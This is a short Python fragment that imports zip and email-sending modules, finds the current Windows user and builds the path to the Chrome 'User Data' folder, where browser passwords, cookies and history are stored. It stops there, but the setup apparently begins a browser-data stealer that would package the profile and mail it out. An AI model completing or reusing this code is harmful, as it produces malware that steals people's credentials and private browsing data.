import os
import zipfile
# Modules for working with emails
import smtplib, ssl

# Find the user of computer and store it
user = os.getlogin()
# Getting the directory 
chrome_data_dir = f"C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"
# os.chdir(chrome_data_dir)
# print(os.getcwd())


